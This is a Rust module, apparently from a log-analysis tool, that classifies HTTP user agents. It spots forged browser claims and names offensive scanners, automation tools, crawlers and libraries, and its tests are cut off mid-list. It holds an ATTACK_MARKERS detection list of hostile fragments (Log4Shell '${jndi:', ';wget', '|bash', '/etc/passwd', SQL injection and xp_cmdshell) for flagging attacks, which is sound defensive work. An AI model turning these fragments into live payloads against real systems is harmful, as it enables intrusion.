//! What a user agent claims to be, and whether that claim can be true.
//!
//! No list of every user agent exists: browsers rebuild theirs on each release
//! and anyone can send any text. A claim is checked instead against what the
//! real browsers send: the exact grammar of each engine (Blink, Gecko,
//! WebKit), the platform tokens they freeze (Windows NT 10.0, macOS 10_15_7),
//! version numbers that existed on the date of the event (release cadences of
//! Chrome, Edge, Firefox and Safari), and combinations no browser produces.
//! Clients that are not browsers are named: HTTP libraries and command-line
//! tools, offensive tools, browser automation, crawlers, monitoring probes and
//! native apps.
//!
//! The result becomes fields of the event: `ua.class`, `ua.family`,
//! `ua.version`, `ua.os` and, when the claim cannot be true, `ua.anomaly`
//! (stable reasons, good for grouping) with `ua.anomaly_detail` (the facts).
use chrono::{Datelike, NaiveDate};
use serde_json::Value;
use std::cell::RefCell;
use std::collections::HashMap;

pub(crate) const BROWSER: &str = "navegador";
pub(crate) const LIBRARY: &str = "biblioteca ou linha de comando";
pub(crate) const OFFENSIVE: &str = "ferramenta ofensiva";
pub(crate) const AUTOMATION: &str = "automação de navegador";
pub(crate) const CRAWLER: &str = "robô ou rastreador";
pub(crate) const MONITOR: &str = "monitoramento";
pub(crate) const APP: &str = "aplicativo";
pub(crate) const EMPTY: &str = "vazio";
pub(crate) const UNKNOWN: &str = "desconhecido";

/// Every class, in the order an analyst reviews them.
pub(crate) const CLASSES: &[&str] = &[OFFENSIVE, AUTOMATION, LIBRARY, UNKNOWN, EMPTY, CRAWLER, MONITOR, APP, BROWSER];

pub(crate) fn describe(class: &str) -> &'static str {
    match class {
        OFFENSIVE => "Ferramentas de varredura e exploração que se identificam (sqlmap, Nikto, Nuclei, WPScan...).",
        AUTOMATION => "Navegadores controlados por programa: sem interface (headless), Selenium, Puppeteer, Playwright.",
        LIBRARY => "Bibliotecas HTTP e linha de comando: curl, Wget, Python, Go, Java, PowerShell, Postman...",
        UNKNOWN => "Textos que não correspondem a navegador, biblioteca, robô ou aplicativo conhecido.",
        EMPTY => "Requisições sem user agent; navegadores sempre enviam um.",
        CRAWLER => "Robôs de busca, de redes sociais, de SEO e de IA que se identificam.",
        MONITOR => "Verificações de disponibilidade e saúde (Zabbix, Nagios, kube-probe, balanceadores).",
        APP => "Aplicativos nativos e suas bibliotecas (Android, iOS, Electron, Office).",
        BROWSER => "Declaram ser navegadores; as anomalias mostram os que não podem ser verdadeiros.",
        _ => "",
    }
}

#[derive(Clone, Debug, PartialEq)]
pub(crate) struct Anomaly {
    /// Stable reason, the same for every event with this problem.
    pub label: &'static str,
    /// What exactly does not fit.
    pub detail: String,
}

#[derive(Clone, Debug, Default, PartialEq)]
pub(crate) struct Profile {
    pub class: &'static str,
    pub family: String,
    pub version: Option<u32>,
    /// Chromium major of Blink-based browsers.
    pub engine: Option<u32>,
    pub os: Option<&'static str>,
    pub anomalies: Vec<Anomaly>,
}

impl Profile {
    fn flag(&mut self, label: &'static str, detail: impl Into<String>) {
        self.anomalies.push(Anomaly { label, detail: detail.into() });
    }
}

const NOT_BROWSER_FORMAT: &str = "fora do formato dos navegadores";
const NO_SUCH_PLATFORM: &str = "plataforma inexistente";
const CONTRADICTORY: &str = "plataformas contraditórias";
const NOT_CHROME: &str = "estrutura diferente da do Chrome";
const NOT_FIREFOX: &str = "estrutura diferente da do Firefox";
const NOT_SAFARI: &str = "Safari impossível";
const UNSUPPORTED: &str = "versão incompatível com o sistema";
const FROZEN: &str = "sistema diferente do enviado pelo navegador";
const REPEATED: &str = "produto repetido";
const FUTURE: &str = "versão que ainda não existia";
const STALE: &str = "versão defasada há anos";
const DISCONTINUED: &str = "navegador descontinuado";
const ATTACK: &str = "conteúdo de ataque";
const CONTROL: &str = "caracteres de controle";
const TOO_LONG: &str = "excessivamente longo";
const RANDOM: &str = "texto aleatório";

/// Version timelines: (version, first stable release) anchors and the cadence
/// after the last anchor. Older stretches use the slower historical cadence.
struct Timeline {
    anchors: &'static [(u32, (i32, u32, u32))],
    cadence_days: i64,
    before_days: i64,
}

const CHROME: Timeline = Timeline { anchors: &[(94, (2021, 9, 21)), (120, (2023, 12, 5)), (140, (2025, 9, 2))], cadence_days: 28, before_days: 42 };
const FIREFOX: Timeline = Timeline { anchors: &[(72, (2020, 1, 7)), (100, (2022, 5, 3)), (120, (2023, 11, 21)), (140, (2025, 6, 24))], cadence_days: 28, before_days: 42 };
/// Betas, nightlies and canaries run a few versions ahead of stable.
const AHEAD: i64 = 4;
/// Behind this many majors only abandoned devices and scripts remain.
const BEHIND: i64 = 48;

impl Timeline {
    /// Newest stable major on `day`.
    fn newest(&self, day: NaiveDate) -> i64 {
        let date = |(y, m, d): (i32, u32, u32)| NaiveDate::from_ymd_opt(y, m, d).expect("timeline date");
        let (first_version, first_day) = self.anchors[0];
        if day < date(first_day) {
            return i64::from(first_version) - (date(first_day) - day).num_days() / self.before_days;
        }
        let mut current = (i64::from(first_version), date(first_day));
        for &(version, when) in &self.anchors[1..] {
            if day < date(when) {
                let span = (date(when) - current.1).num_days().max(1);
                let versions = i64::from(version) - current.0;
                return current.0 + (day - current.1).num_days() * versions / span;
            }
            current = (i64::from(version), date(when));
        }
        current.0 + (day - current.1).num_days() / self.cadence_days
    }
}

/// Safari majors follow the September macOS/iOS releases (18 in 2024, then
/// 26 in 2025 when Apple moved to year numbers).
fn newest_safari(day: NaiveDate) -> i64 {
    let year = i64::from(day.year()) - i64::from(day.month() < 9);
    if year >= 2025 { 26 + (year - 2025) } else { 17 + (year - 2023) }
}

/// Value of `name` (like "Chrome/") as a whole product token.
fn token<'a>(ua: &'a str, name: &str) -> Option<&'a str> {
    let mut search = ua;
    loop {
        let at = search.find(name)?;
        let before = search[..at].chars().next_back();
        let rest = &search[at + name.len()..];
        if before.is_none_or(|c| !c.is_ascii_alphanumeric()) {
            let end = rest.find(|c: char| c == ' ' || c == ';' || c == ')' || c == '(').unwrap_or(rest.len());
            return Some(&rest[..end]);
        }
        search = rest;
    }
}

fn major(version: &str) -> Option<u32> {
    version.split(['.', '_']).next()?.parse().ok()
}

const OFFENSIVE_TOOLS: &[(&str, &str)] = &[
    ("sqlmap", "sqlmap"), ("nikto", "Nikto"), ("nmap", "Nmap"), ("masscan", "masscan"), ("zgrab", "ZGrab"),
    ("gobuster", "Gobuster"), ("dirbuster", "DirBuster"), ("dirb/", "dirb"), ("wfuzz", "Wfuzz"),
    ("fuzz faster u fool", "ffuf"), ("ffuf", "ffuf"), ("hydra", "Hydra"), ("nuclei", "Nuclei"), ("acunetix", "Acunetix"),
    ("nessus", "Nessus"), ("openvas", "OpenVAS"), ("wpscan", "WPScan"), ("jorgee", "Jorgee"), ("havij", "Havij"),
    ("commix", "Commix"), ("burp", "Burp Suite"), ("owasp zap", "OWASP ZAP"), ("zaproxy", "OWASP ZAP"),
    ("metasploit", "Metasploit"), ("feroxbuster", "feroxbuster"), ("arachni", "Arachni"), ("w3af", "w3af"),
    ("xsstrike", "XSStrike"), ("netsparker", "Netsparker"), ("invicti", "Invicti"), ("qualys", "Qualys"),
    ("appscan", "AppScan"), ("webinspect", "WebInspect"), ("skipfish", "Skipfish"), ("whatweb", "WhatWeb"),
    ("wapiti", "Wapiti"), ("joomscan", "JoomScan"), ("droopescan", "droopescan"), ("dirsearch", "dirsearch"),
    ("zmeu", "ZmEu"), ("morfeus", "Morfeus"), ("struts-pwn", "struts-pwn"), ("interactsh", "interactsh"),
    ("censysinspect", "Censys"), ("l9explore", "LeakIX"), ("l9tcpid", "LeakIX"), ("expanse", "Palo Alto Expanse"),
    ("internet-measurement", "internet-measurement"), ("shodan", "Shodan"), ("httpx - open-source", "httpx (ProjectDiscovery)"),
    ("caido", "Caido"), ("katana", "Katana"), ("jaeles", "Jaeles"),
];

const AUTOMATION_TOOLS: &[(&str, &str)] = &[
    ("headlesschrome", "Chrome sem interface (headless)"), ("phantomjs", "PhantomJS"), ("selenium", "Selenium"),
    ("webdriver", "WebDriver"), ("puppeteer", "Puppeteer"), ("playwright", "Playwright"), ("cypress", "Cypress"),
    ("slimerjs", "SlimerJS"), ("htmlunit", "HtmlUnit"), ("splash", "Splash"), ("nightmare", "Nightmare"),
    ("jsdom", "jsdom"), ("zombie.js", "Zombie.js"), ("lightpanda", "Lightpanda"),
];

const MONITORS: &[(&str, &str)] = &[
    ("zabbix", "Zabbix"), ("nagios", "Nagios"), ("check_http", "Nagios check_http"), ("uptimerobot", "UptimeRobot"),
    ("pingdom", "Pingdom"), ("statuscake", "StatusCake"), ("site24x7", "Site24x7"), ("newrelicpinger", "New Relic"),
    ("datadog", "Datadog"), ("prometheus", "Prometheus"), ("blackbox-exporter", "Prometheus Blackbox"),
    ("kube-probe", "Kubernetes probe"), ("elb-healthchecker", "AWS ELB health check"), ("googlehc", "Google health check"),
    ("better uptime", "Better Uptime"), ("betteruptime", "Better Uptime"), ("checkly", "Checkly"),
    ("dynatrace", "Dynatrace"), ("appdynamics", "AppDynamics"), ("grafana", "Grafana"), ("consul health", "Consul"),
    ("f5-healthmonitor", "F5 health monitor"), ("haproxy", "HAProxy health check"), ("monit/", "Monit"),
    ("azure traffic manager", "Azure Traffic Manager"), ("alwayson", "AlwaysOn"),
];

const CRAWLERS: &[(&str, &str)] = &[
    ("googlebot", "Googlebot"), ("google-inspectiontool", "Google Inspection Tool"), ("googleother", "GoogleOther"),
    ("adsbot-google", "AdsBot-Google"), ("mediapartners-google", "Google AdSense"), ("google-extended", "Google-Extended"),
    ("storebot-google", "Storebot-Google"), ("bingbot", "Bingbot"), ("bingpreview", "BingPreview"), ("msnbot", "MSNBot"),
    ("slurp", "Yahoo Slurp"), ("duckduckbot", "DuckDuckBot"), ("baiduspider", "Baiduspider"), ("yandex", "Yandex"),
    ("sogou", "Sogou"), ("exabot", "Exabot"), ("facebookexternalhit", "Facebook"), ("facebot", "Facebook"),
    ("meta-externalagent", "Meta"), ("twitterbot", "Twitterbot"), ("linkedinbot", "LinkedInBot"), ("slackbot", "Slackbot"),
    ("discordbot", "Discordbot"), ("telegrambot", "TelegramBot"), ("whatsapp", "WhatsApp"), ("applebot", "Applebot"),
    ("ahrefsbot", "AhrefsBot"), ("semrushbot", "SemrushBot"), ("mj12bot", "MJ12bot"), ("dotbot", "DotBot"),
    ("petalbot", "PetalBot"), ("bytespider", "Bytespider"), ("gptbot", "GPTBot"), ("chatgpt-user", "ChatGPT-User"),
    ("oai-searchbot", "OAI-SearchBot"), ("claudebot", "ClaudeBot"), ("claude-web", "Claude-Web"),
    ("anthropic-ai", "Anthropic"), ("perplexitybot", "PerplexityBot"), ("amazonbot", "Amazonbot"), ("ccbot", "CCBot"),
    ("dataforseobot", "DataForSeoBot"), ("seznambot", "SeznamBot"), ("qwantify", "Qwant"), ("coccocbot", "Cốc Cốc"),
    ("mojeekbot", "MojeekBot"), ("archive.org_bot", "Internet Archive"), ("ia_archiver", "Alexa/Archive"),
    ("blexbot", "BLEXBot"), ("serpstatbot", "SerpstatBot"), ("barkrowler", "Barkrowler"), ("seekportbot", "SeekportBot"),
    ("imagesiftbot", "ImagesiftBot"), ("owler", "OWLer"), ("diffbot", "Diffbot"), ("yeti/", "Naver Yeti"), ("ias-", "Integral Ad Science"),
];

const LIBRARIES: &[(&str, &str)] = &[
    ("curl/", "curl"), ("wget/", "Wget"), ("python-requests", "python-requests"), ("python-urllib", "Python urllib"),
    ("python-httpx", "httpx"), ("aiohttp", "aiohttp"), ("httpx/", "httpx"), ("scrapy", "Scrapy"), ("urllib3", "urllib3"),
    ("python/", "Python"), ("go-http-client", "Go net/http"), ("java-http-client", "Java HttpClient"), ("java/", "Java"),
    ("apache-httpclient", "Apache HttpClient"), ("apache-httpasyncclient", "Apache HttpAsyncClient"),
    ("jakarta commons-httpclient", "Commons HttpClient"), ("apache cxf", "Apache CXF"), ("apache-cxf", "Apache CXF"),
    ("okhttp", "OkHttp"), ("axios", "axios"), ("node-fetch", "node-fetch"), ("undici", "undici"), ("got (", "got"),
    ("node/", "Node.js"), ("deno/", "Deno"), ("bun/", "Bun"), ("libwww-perl", "libwww-perl"), ("lwp::", "Perl LWP"),
    ("guzzlehttp", "Guzzle"), ("php/", "PHP"), ("ruby", "Ruby"), ("faraday", "Faraday"), ("rest-client", "rest-client"),
    ("typhoeus", "Typhoeus"), ("mechanize", "Mechanize"), ("windowspowershell", "PowerShell"), ("powershell/", "PowerShell"),
    ("microsoft-cryptoapi", "Windows CryptoAPI"), ("winhttp", "WinHTTP"), ("microsoft-delivery-optimization", "Delivery Optimization"),
    ("microsoft bits", "BITS"), ("postmanruntime", "Postman"), ("insomnia", "Insomnia"), ("httpie", "HTTPie"),
    ("aria2", "aria2"), ("restsharp", "RestSharp"), ("dart/", "Dart"), ("reactor-netty", "Reactor Netty"),
    ("vert.x", "Vert.x"), ("jersey/", "Jersey"), ("ahc/", "Async HTTP Client"), ("indy library", "Indy"),
    ("embarcadero", "Embarcadero"), ("lua-resty-http", "lua-resty-http"), ("reqwest", "reqwest"), ("hyper/", "hyper"),
    ("cpp-httplib", "cpp-httplib"), ("libcurl", "libcurl"), ("http_request2", "PEAR HTTP"), ("synapse", "Synapse"),
    ("winhttprequest", "WinHttpRequest"), ("certutil", "certutil"), ("bitsadmin", "BITSAdmin"), ("fasthttp", "fasthttp"),
    ("colly", "Colly"), ("libfetch", "libfetch"), ("lynx/", "Lynx"), ("links (", "Links"), ("w3m/", "w3m"),
    ("elinks", "ELinks"),
];

/// Native apps and their own HTTP stacks.
const APPS: &[(&str, &str)] = &[
    ("dalvik/", "Android (Dalvik)"), ("cfnetwork/", "Apple CFNetwork"), ("com.apple.webkit", "Apple WebKit (sistema)"), ("networkingextension", "Apple NetworkingExtension"), ("electron/", "Electron"),
    ("microsoft office", "Microsoft Office"), ("ms-office", "Microsoft Office"), ("onedrive", "OneDrive"),
    ("dropbox", "Dropbox"), ("itunes", "iTunes"), ("spotify", "Spotify"),
];

fn lookup(lower: &str, table: &[(&'static str, &'static str)]) -> Option<(&'static str, &'static str)> {
    table.iter().find(|(needle, _)| lower.contains(needle)).copied()
}

/// Major version written right after a product name ("curl/8.4.0").
fn version_after(lower: &str, needle: &str) -> Option<u32> {
    let rest = &lower[lower.find(needle)? + needle.len()..];
    let rest = rest.strip_prefix('/').unwrap_or(rest);
    major(rest.split(|c: char| !c.is_ascii_digit() && c != '.').next()?)
}

fn platform(ua: &str) -> Option<&'static str> {
    if ua.contains("iPhone") || ua.contains("iPod") {
        Some("iOS")
    } else if ua.contains("iPad") {
        Some("iPadOS")
    } else if ua.contains("Android") {
        Some("Android")
    } else if ua.contains("Windows Phone") {
        Some("Windows Phone")
    } else if ua.contains("Windows") {
        Some("Windows")
    } else if ua.contains("Macintosh") || ua.contains("Mac OS X") {
        Some("macOS")
    } else if ua.contains("CrOS") {
        Some("ChromeOS")
    } else if ua.contains("Linux") || ua.contains("X11") {
        Some("Linux")
    } else {
        None
    }
}

/// Parts of a browser claim that do not depend on the date.
fn browser(ua: &str, profile: &mut Profile) {
    let os = platform(ua);
    profile.os = os;
    let chrome = token(ua, "Chrome/").and_then(major);
    profile.engine = chrome;
    let (family, version) = if let Some(v) = token(ua, "Edg/").or_else(|| token(ua, "EdgA/")).or_else(|| token(ua, "EdgiOS/")) {
        ("Edge", major(v))
    } else if let Some(v) = token(ua, "OPR/").or_else(|| token(ua, "OPT/")) {
        ("Opera", major(v))
    } else if let Some(v) = token(ua, "SamsungBrowser/") {
        ("Samsung Internet", major(v))
    } else if let Some(v) = token(ua, "YaBrowser/") {
        ("Yandex Browser", major(v))
    } else if let Some(v) = token(ua, "Vivaldi/") {
        ("Vivaldi", major(v))
    } else if let Some(v) = token(ua, "UCBrowser/") {
        ("UC Browser", major(v))
    } else if let Some(v) = token(ua, "CriOS/") {
        ("Chrome (iOS)", major(v))
    } else if let Some(v) = token(ua, "FxiOS/") {
        ("Firefox (iOS)", major(v))
    } else if let Some(v) = token(ua, "Firefox/") {
        ("Firefox", major(v))
    } else if chrome.is_some() {
        ("Chrome", chrome)
    } else if os == Some("Android") && ua.contains("Version/4.0") {
        ("Navegador Android antigo", None)
    } else if let Some(v) = token(ua, "Version/").filter(|_| ua.contains("Safari/")) {
        ("Safari", major(v))
    } else if let Some(v) = token(ua, "MSIE ") {
        ("Internet Explorer", major(v))
    } else if ua.contains("Trident/") {
        ("Internet Explorer", Some(11))
    } else {
        ("Navegador não identificado", None)
    };
    profile.family = family.into();
    profile.version = version;
    if !ua.starts_with("Mozilla/5.0 (") && !ua.starts_with("Mozilla/4.0 (") {
        profile.flag(NOT_BROWSER_FORMAT, "não começa como os navegadores, com Mozilla/5.0 seguido da plataforma");
    }
    if ua.contains("Windows NT 11") || ua.contains("Windows NT 12") {
        profile.flag(NO_SUCH_PLATFORM, "Windows NT 11 não existe: o Windows 11 se identifica como Windows NT 10.0");
    }
    let apple_mobile = matches!(os, Some("iOS") | Some("iPadOS"));
    if (ua.contains("iPhone") || ua.contains("iPad")) && ua.contains("Windows NT")
        || ua.contains("Android") && (ua.contains("Macintosh") || ua.contains("Windows NT"))
    {
        profile.flag(CONTRADICTORY, "duas plataformas diferentes no mesmo user agent");
    }
    let old_windows = ua.contains("Windows NT 6.") || ua.contains("Windows NT 5.");
    if let Some(chrome) = chrome {
        if token(ua, "AppleWebKit/") != Some("537.36") {
            profile.flag(NOT_CHROME, "Chrome declarado sem o AppleWebKit/537.36 que o Blink sempre envia");
        }
        if !ua.contains("(KHTML, like Gecko)") {
            profile.flag(NOT_CHROME, "Chrome declarado sem o trecho (KHTML, like Gecko)");
        }
        if token(ua, "Safari/") != Some("537.36") {
            profile.flag(NOT_CHROME, "Chrome declarado sem o Safari/537.36 final");
        }
        if apple_mobile {
            profile.flag(NOT_CHROME, "no iPhone/iPad o Chrome se identifica como CriOS, não Chrome/");
        }
        if family == "Edge" && version.is_some_and(|v| v > 79 && v != chrome) {
            profile.flag(NOT_CHROME, format!("Edge {} sobre Chromium {chrome}: o Edge sempre acompanha a versão do Chromium", version.unwrap_or(0)));
        }
        if chrome >= 110 && old_windows {
            profile.flag(UNSUPPORTED, format!("Chrome {chrome} não roda em Windows 7, 8 ou XP (o último foi o 109)"));
        }
        if chrome >= 117 && os == Some("macOS") && !ua.contains("Mac OS X 10_15_7") {
            profile.flag(FROZEN, format!("Chrome {chrome} sempre envia macOS 10_15_7, qualquer que seja a versão real"));
        }
    }
    if family == "Firefox" {
        let rv = token(ua, "rv:").and_then(major);
        if rv.is_some() && rv != version {
            profile.flag(NOT_FIREFOX, format!("rv:{} diferente de Firefox/{} (os dois são sempre iguais)", rv.unwrap_or(0), version.unwrap_or(0)));
        }
        if !ua.contains("Gecko/") {
            profile.flag(NOT_FIREFOX, "Firefox declarado sem o motor Gecko/");
        }
        if ua.contains("AppleWebKit/") || chrome.is_some() {
            profile.flag(NOT_FIREFOX, "Firefox declarado com tokens de navegadores WebKit/Blink");
        }
        let firefox = version.unwrap_or(0);
        if firefox >= 117 && os == Some("macOS") && !ua.contains("Mac OS X 10.15") {
            profile.flag(FROZEN, format!("Firefox {firefox} sempre envia macOS 10.15, qualquer que seja a versão real"));
        }
        if firefox >= 116 && old_windows {
            profile.flag(UNSUPPORTED, format!("Firefox {firefox} não roda em Windows 7, 8 ou XP (o último foi o 115 ESR)"));
        }
    }
    if family == "Safari" {
        if !matches!(os, Some("macOS") | Some("iOS") | Some("iPadOS")) {
            profile.flag(NOT_SAFARI, "Safari só existe em sistemas da Apple");
        }
        if token(ua, "AppleWebKit/").and_then(major).unwrap_or(0) >= 600 && version.unwrap_or(99) < 8 {
            profile.flag(NOT_SAFARI, "versão do Safari mais antiga que o WebKit declarado");
        }
    }
    for product in ["Chrome/", "Firefox/", "Version/", "Edg/"] {
        if ua.matches(product).count() > 1 {
            profile.flag(REPEATED, format!("{product} aparece mais de uma vez"));
        }
    }
}

/// Parts that depend on the date of the event: versions that did not exist
/// yet, and versions so old that only scripts still send them.
fn dated(profile: &Profile, day: NaiveDate) -> Vec<Anomaly> {
    fn check(name: &str, version: Option<u32>, newest: i64, stale: bool) -> Option<Anomaly> {
        let version = i64::from(version?);
        if version > newest + AHEAD {
            Some(Anomaly { label: FUTURE, detail: format!("{name} {version} ainda não existia nesta data (a mais nova era por volta da {newest})") })
        } else if stale && version + BEHIND < newest {
            Some(Anomaly { label: STALE, detail: format!("{name} {version} está anos atrás da versão desta data (por volta da {newest})") })
        } else {
            None
        }
    }
    let chrome = CHROME.newest(day);
    let family = profile.family.as_str();
    let own = match family {
        "Firefox" | "Firefox (iOS)" => check(family, profile.version, FIREFOX.newest(day), family == "Firefox"),
        "Safari" => check("Safari", profile.version, newest_safari(day), false),
        "Chrome (iOS)" => check("Chrome", profile.version, chrome, false),
        "Internet Explorer" if day.year() >= 2023 => Some(Anomaly { label: DISCONTINUED, detail: "o Internet Explorer foi desativado em 2022".into() }),
        "Navegador Android antigo" if day.year() >= 2020 => Some(Anomaly { label: DISCONTINUED, detail: "o navegador nativo do Android foi substituído pelo Chrome em 2014".into() }),
        _ => None,
    };
    let engine = check("Chrome", profile.engine, chrome, matches!(family, "Chrome" | "Edge"));
    own.into_iter().chain(engine).collect()
}

const ATTACK_MARKERS: &[&str] = &[
    "${jndi:", "${${", "() {", "<script", "javascript:", "union select", "' or '", "\" or \"", "../", "..\\", "%00",
    "$(", "`", ";wget", "|bash", "|sh", "/etc/passwd", "cmd.exe", "powershell -", "<?php", "{{", "${", "sleep(",
    "waitfor delay", "benchmark(", "xp_cmdshell",
];

fn classify(ua: &str) -> Profile {
    let trimmed = ua.trim();
    let mut profile = Profile { class: UNKNOWN, ..Profile::default() };
    if trimmed.is_empty() || trimmed == "-" || trimmed.eq_ignore_ascii_case("null") || trimmed.eq_ignore_ascii_case("none") {
        profile.class = EMPTY;
        profile.family = "sem user agent".into();
        return profile;
    }
    let lower = trimmed.to_ascii_lowercase();
    if ATTACK_MARKERS.iter().any(|marker| lower.contains(marker)) {
        profile.flag(ATTACK, "o user agent carrega um payload de ataque");
    }
    if trimmed.chars().any(char::is_control) {
        profile.flag(CONTROL, "caracteres de controle no user agent");
    }
    if trimmed.len() > 512 {
        profile.flag(TOO_LONG, format!("{} caracteres; navegadores enviam menos de 300", trimmed.len()));
    }
    let mozilla = lower.starts_with("mozilla/");
    let named = [(OFFENSIVE, OFFENSIVE_TOOLS), (AUTOMATION, AUTOMATION_TOOLS), (MONITOR, MONITORS), (CRAWLER, CRAWLERS), (APP, APPS), (LIBRARY, LIBRARIES)]
        .into_iter()
        .find_map(|(class, table)| lookup(&lower, table).map(|found| (class, found)))
        // Browsers mention libraries only when they are not browsers at all.
        .filter(|(class, _)| *class != LIBRARY || !mozilla || lower.contains("powershell") || lower.contains("winhttp"));
    if let Some((class, (needle, name))) = named {
        profile.class = class;
        profile.family = name.into();
        profile.version = version_after(&lower, needle);
        if matches!(class, AUTOMATION | APP) {
            profile.os = platform(trimmed);
        }
    } else if ["bot", "crawler", "spider", "scraper", "fetcher", "slurp"].iter().any(|w| lower.contains(w))
        && (lower.contains("http") || lower.contains('@') || !lower.contains("safari"))
    {
        profile.class = CRAWLER;
        profile.family = "robô não identificado".into();
    } else if mozilla || ["applewebkit/", "gecko/", "opera/", "chrome/", "firefox/", "safari/"].iter().any(|t| lower.contains(t)) {
        profile.class = BROWSER;
        browser(trimmed, &mut profile);
    } else {
        profile.family = trimmed.split(['/', ' ', ';', '(']).next().unwrap_or("").chars().take(40).collect();
        if profile.family.is_empty() {
            profile.family = "cliente não identificado".into();
        }
        let alphanumeric = trimmed.chars().all(char::is_alphanumeric);
        if alphanumeric && trimmed.len() >= 12 && trimmed.chars().any(|c| c.is_ascii_digit()) && trimmed.chars().any(char::is_uppercase) {
            profile.flag(RANDOM, "sequência aleatória no lugar de um user agent");
        }
    }
    profile
}

thread_local! {
    static CACHE: RefCell<HashMap<String, Profile>> = RefCell::new(HashMap::new());
}

/// Profile of a user agent on the date of the event (`at`, epoch ms).
pub(crate) fn profile(ua: &str, at: Option<i64>) -> Profile {
    let mut profile = CACHE.with(|cache| {
        let mut cache = cache.borrow_mut();
        if let Some(found) = cache.get(ua) {
            return found.clone();
        }
        let found = classify(ua);
        if cache.len() >= 8192 {
            cache.clear();
        }
        cache.insert(ua.to_string(), found.clone());
        found
    });
    if profile.class == BROWSER {
        if let Some(day) = at.and_then(chrono::DateTime::from_timestamp_millis).map(|t| t.date_naive()) {
            profile.anomalies.extend(dated(&profile, day));
        }
    }
    profile
}

/// The user agent written by the event, if any.
fn user_agent(ev: &crate::model::Event) -> Option<String> {
    let value = crate::entities::explicit_value(ev, crate::entities::Role::UserAgent)?;
    // W3C logs (IIS) write '+' for each space.
    Some(if value.contains('+') && !value.contains(' ') { value.replace('+', " ") } else { value.into_owned() })
}

/// Adds the `ua.*` fields to an event that carries a user agent.
pub(crate) fn annotate(ev: &mut crate::model::Event) {
    if ev.fields.contains_key("ua.class") {
        return;
    }
    let Some(ua) = user_agent(ev) else { return };
    let profile = profile(&ua, ev.timestamp);
    ev.fields.insert("ua.class".into(), Value::from(profile.class));
    if !profile.family.is_empty() {
        ev.fields.insert("ua.family".into(), Value::from(profile.family));
    }
    if let Some(version) = profile.version {
        ev.fields.insert("ua.version".into(), Value::from(version.to_string()));
    }
    if let Some(os) = profile.os {
        ev.fields.insert("ua.os".into(), Value::from(os));
    }
    if !profile.anomalies.is_empty() {
        let mut labels: Vec<&str> = Vec::new();
        for anomaly in &profile.anomalies {
            if !labels.contains(&anomaly.label) {
                labels.push(anomaly.label);
            }
        }
        let details: Vec<&str> = profile.anomalies.iter().map(|a| a.detail.as_str()).collect();
        ev.fields.insert("ua.anomaly".into(), Value::from(labels.join("; ")));
        ev.fields.insert("ua.anomaly_detail".into(), Value::from(details.join("; ")));
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn at(y: i32, m: u32, d: u32) -> Option<i64> {
        Some(NaiveDate::from_ymd_opt(y, m, d).unwrap().and_hms_opt(12, 0, 0).unwrap().and_utc().timestamp_millis())
    }

    #[test]
    fn real_browsers_are_clean() {
        let today = at(2026, 10, 12);
        for ua in [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:150.0) Gecko/20100101 Firefox/150.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.0.0",
            "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/28.0 Chrome/130.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 14; Pixel 8 Build/AP2A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/148.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/150.0.0.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 26_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0",
            "Mozilla/5.0 (Android 14; Mobile; rv:150.0) Gecko/150.0 Firefox/150.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 OPR/124.0.0.0",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
        ] {
            let p = profile(ua, today);
            assert_eq!(p.class, BROWSER, "{ua}");
            assert!(p.anomalies.is_empty(), "{ua}: {:?}", p.anomalies);
        }
        // Released versions of their time are not stale in the past either.
        let old = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36";
        assert!(profile(old, at(2021, 7, 1)).anomalies.is_empty());
    }

    #[test]
    fn forged_and_impossible_browsers() {
        let today = at(2026, 10, 12);
        for (ua, label, detail) in [
            ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/190.0.0.0 Safari/537.36", FUTURE, "ainda não existia"),
            ("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/150.0", NOT_FIREFOX, "rv:140"),
            ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15", NOT_SAFARI, "Apple"),
            ("Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36", UNSUPPORTED, "Windows 7"),
